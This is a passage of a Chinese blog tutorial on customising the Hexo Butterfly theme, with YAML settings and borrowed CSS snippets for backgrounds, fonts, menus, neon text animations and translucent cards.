class="attr">pangu:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post</span></span><br></pre></td></tr></table></figure></li><li><p>图片懒加载</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约908行</span></span><br><span class="line"><span class="attr">lazyload:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span> <span class="comment"># site/post</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line">  <span class="attr">blur:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol>              </div>            </details><h3 id="CSS插件"><a href="#CSS插件" class="headerlink" title="CSS插件"></a>CSS插件</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p><strong>butterfly中引入css</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 大约944行</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css&quot;&gt;</span> <span class="comment"># 引入组件库(f12)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/readPercent.css&quot;&gt;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/announcement.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><strong>custom.css</strong></p><ol><li><p>一图流</p>   <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*一图流*/</span></span><br><span class="line"><span class="comment">/* 页脚与头图透明 */</span></span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#page-header</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 白天模式遮罩透明 */</span><span class="comment">/*设置的话记得不设置头图*/</span></span><br><span class="line">  <span class="comment">/*#footer::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  #page-header::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br><span class="line">  <span class="comment">/* 夜间模式遮罩透明 */</span><span class="comment">/*设置的话记得不设置页脚*/</span></span><br><span class="line">  <span class="comment">/*[data-theme=&quot;dark&quot;] #footer::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  [data-theme=&quot;dark&quot;] #page-header::before &#123;</span></span><br><span class="line"><span class="comment">    background: transparent !important;</span></span><br><span class="line"><span class="comment">  &#125;*/</span></span><br></pre></td></tr></table></figure></li><li><p>字体</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*字体*/</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="comment">/* 为载入的字体取名字(随意) */</span></span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&#x27;YSHST&#x27;</span>;</span><br><span class="line">  <span class="comment">/* 字体文件地址(相对或者绝对路径都可以) */</span></span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">/font/MaoKenZhuYuanTi-MaokenZhuyuanTi-2.ttf</span>);</span><br><span class="line">  <span class="comment">/* 定义加粗样式(加粗多少) */</span></span><br><span class="line">  <span class="attribute">font-weight</span>: normal;</span><br><span class="line">  <span class="comment">/* 定义字体样式(斜体/非斜体) */</span></span><br><span class="line">  <span class="attribute">font-style</span>: normal;</span><br><span class="line">  <span class="comment">/* 定义显示样式 */</span></span><br><span class="line">  <span class="attribute">font-display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>菜单栏</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*菜单栏设置*/</span></span><br><span class="line"><span class="comment">/* 一级菜单居中 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>: fit-content <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 子菜单横向展示 */</span></span><br><span class="line"><span class="comment">/*#nav .menus_items .menus_item:hover .menus_item_child &#123;</span></span><br><span class="line"><span class="comment">  display: flex !important;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */</span></span><br><span class="line"><span class="comment">/*.menus_items .menus_item:nth-child(2) .menus_item_child &#123;</span></span><br><span class="line"><span class="comment">  left: -125px;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure></li><li><p>夜间霓虹灯</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*夜间霓虹灯*/</span></span><br><span class="line"><span class="comment">/* 日间模式不生效 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-name</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-title</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#site-subtitle</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;light&quot;</span>]</span> <span class="selector-id">#post-info</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式生效 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-name</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-title</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_15px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#site-subtitle</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_10px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#post-info</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: light_5px <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 关键帧描述 */</span></span><br><span class="line"><span class="keyword">@keyframes</span> light_15px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> light_10px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> light_5px &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">12.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#11ee5e</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">25%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f14747</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">37.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1a247</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#f1ee47</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#b347f1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">62.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#002afa</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">75%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#ed709b</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">87.5%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#39c5bb</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: <span class="number">#5636ed</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>宇宙星空特效</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*宇宙星空特效*/</span></span><br><span class="line"><span class="comment">/* 背景宇宙星光 */</span></span><br><span class="line"><span class="selector-id">#universe</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="comment">/* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */</span></span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>个人卡片渐变色</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*个人卡片渐变色*/</span></span><br><span class="line"><span class="comment">/* 侧边栏个人信息卡片动态渐变色 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">    -<span class="number">45deg</span>,</span><br><span class="line">    <span class="number">#e8d8b9</span>,</span><br><span class="line">    <span class="number">#eccec5</span>,</span><br><span class="line">    <span class="number">#a3e9eb</span>,</span><br><span class="line">    <span class="number">#bdbdf0</span>,</span><br><span class="line">    <span class="number">#eec1ea</span></span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgb</span>(<span class="number">66</span>, <span class="number">68</span>, <span class="number">68</span>);</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">400%</span> <span class="number">400%</span>;</span><br><span class="line">  -webkit-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  -moz-<span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite;</span><br><span class="line">  <span class="attribute">animation</span>: Gradient <span class="number">10s</span> ease infinite <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-webkit-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@-moz-keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> Gradient &#123;</span><br><span class="line">  <span class="number">0%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">100%</span> &#123;</span><br><span class="line">    <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">50%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 黑夜模式适配 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#191919ee</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 个人信息Follow me按钮 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> &gt; <span class="selector-class">.card-widget</span><span class="selector-class">.card-info</span> &gt; <span class="selector-id">#card-info-btn</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#3eb8be</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>样式整体设计</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*页面样式整体设计*/</span></span><br><span class="line"><span class="comment">/*根*/</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--trans-light</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.65</span>);</span><br><span class="line">  <span class="attr">--trans-dark</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.65</span>);</span><br><span class="line">  <span class="attr">--border-style</span>: <span class="number">2px</span> solid <span class="built_in">rgb</span>(<span class="number">169</span>, <span class="number">169</span>, <span class="number">169</span>);</span><br><span class="line">  <span class="attr">--backdrop-filter</span>: <span class="built_in">blur</span>(<span class="number">5px</span>) <span class="built_in">saturate</span>(<span class="number">150%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页文章卡片 */</span></span><br><span class="line"><span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-light);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 首页侧栏卡片 */</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-light);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">18px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 文章页、归档页、普通页面 */</span></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#page</span>,</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-id">#archive</span> &#123;</span><br><span class="line">  <span class="comment">/*background: var(--trans-light);*/</span></span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--border-style);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 导航栏 */</span></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.75</span>);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">var</span>(--backdrop-filter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#page-header</span><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.7</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式遮罩 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#recent-posts</span> &gt; <span class="selector-class">.recent-post-item</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#post</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#archive</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-tag">div</span><span class="selector-id">#page</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">var</span>(--trans-dark);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式页脚页头遮罩透明 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#footer</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#page-header</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 阅读模式 */</span></span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">158</span>, <span class="number">204</span>, <span class="number">171</span>, <span class="number">0.5</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 夜间模式下的阅读模式 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-class">.read-mode</span> <span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.9</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-class">.read-mode</span> <span class="selector-tag">div</span><span class="selector-id">#post</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">0.9</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>顶栏常驻</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/*顶栏常驻*/</span></span><br><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span>&#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -moz-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -ms-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">  -o-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#nav</span>&#123;</span><br><span class="line">  <span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -ms-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">  -o-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span 